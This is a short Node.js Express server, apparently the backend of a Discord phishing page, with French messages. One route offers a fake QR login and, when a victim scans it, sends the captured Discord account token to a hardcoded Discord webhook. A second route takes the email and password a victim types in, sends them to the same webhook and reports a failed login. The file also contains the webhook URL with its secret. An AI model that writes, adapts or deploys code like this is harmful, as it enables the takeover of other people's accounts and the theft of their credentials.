const express = require('express');
const axios = require('axios');
const WebSocket = require('ws');
const app = express();

app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1565634875921272852/aMNpvHoAeH2iXdtQaGb-qwkpgc5xwJ3pB6NfhMD1_FhTGMSYM62ODX0YUcyubZt6ZRpg';

app.get('/api/qr', async (req, res) => {
  try {
    const fingerprintRes = await axios.post('https://discord.com/api/v9/auth/fingerprint', { 
        fingerprint: "12345678901234567890123456789012" 
    });
    const fingerprint = fingerprintRes.data.fingerprint;
    const qrUrl = `https://discord.com/api/v9/auth/qr?fingerprint=${fingerprint}`;

    const ws = new WebSocket(`wss://gateway.discord.gg/?v=9&encoding=json`);
    
    ws.on('open', () => {
      ws.send(JSON.stringify({ op: 2, d: { fingerprint: fingerprint, type: 1 } }));
    });
    
    ws.on('message', async (data) => {
      const payload = JSON.parse(data);
      if (payload.t === 'QR_CODE_AUTHENTICATED') {
        await axios.post(WEBHOOK_URL, { 
          content: `🔥 **Token volé via QR :**\n\`${payload.d.token}\`` 
        });
        ws.close();
      }
    });

    res.json({ qrUrl: qrUrl });
  } catch (error) {
    res.status(500).json({ error: "Erreur Discord" });
  }
});

// Le reste pour le mot de passe
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  try {
    await axios.post(WEBHOOK_URL, { content: `🎯 **Mdp volé:**\nEmail: \`${email}\`\nPass: \`${password}\`` });
  } catch (e) {}
  res.json({ success: false });
});

app.listen(3000, () => console.log('Bench prête.'));
